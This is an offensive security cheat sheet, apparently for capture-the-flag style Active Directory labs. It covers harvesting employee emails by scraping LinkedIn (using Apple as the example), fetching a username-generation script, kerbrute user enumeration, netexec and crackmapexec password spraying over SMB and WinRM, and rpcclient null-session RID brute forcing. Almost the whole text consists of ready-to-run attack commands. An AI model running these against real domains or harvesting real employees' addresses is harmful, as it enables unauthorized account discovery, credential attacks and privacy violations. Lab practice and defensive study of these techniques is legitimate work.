### **GENERATE USER LIST**

1.  Websites like hunter.io help discover employee email patterns. For example, entering "apple.com" shows that emails often follow the pattern {f}{last}@apple.com. So, instead of finding each email, you can guess them. By scraping a list of Apple employees from LinkedIn, you can transform names into emails (e.g., Steve Jobs becomes s.jobs@apple.com). While not all guesses will be accurate, many should be correct.
    
2.  Alternatively, we can use a Python script to generate potential usernames  
    `wget https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py`
    
3.  Once you have the list, we can verify if these usernames exist using kerbrute:  
    `kerbrute userenum --dc [IP-ADRESS] -d hackfast.local username.lst`  
    **NOTE:** you can also use username wordlist:  
    `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
    

### **SMB ENUMERATION**

1.  Netexec with SMB:  
    `netexec smb [IP-ADRESS] -u users.txt -p '[PASSWORD]' --continue-on-success`
2.  CrackMapExec with SMB:  
    `crackmapexec smb [IP-ADRESS] -u users.txt -p '[PASSWORD]' --continue-on-success`

### **WINRM ENUMERATION**

1.  Netexec with Winrm:  
    `netexec winrm office.htb -u users.txt -p '[PASSWORD]' --continue-on-success`
2.  CrackMapExec with Winrm:  
    `crackmapexec winrm 10.10.10.184 -u users.txt -p '[PASSWORD]' --continue-on-success`

### **RPCCLIENT ENUMERATION**

1.  Start Null Session:  
    `rpcclient -U "" -N [IP_ADDRESS]`
    
2.  List All Users in the Domain:  
    `rpcclient -U "" -N [IP_ADDRESS] -c "enumdomusers" > output.txt`
    
3.  Extract User Names:  
    `cat output.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users.lst`
    
4.  Brute Forcing User RIDs:  
    `for i in $(seq 500 1100); do rpcclient -N -U "" [IP_ADDRESS] -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name|user_rid|group_rid" && echo ""; done`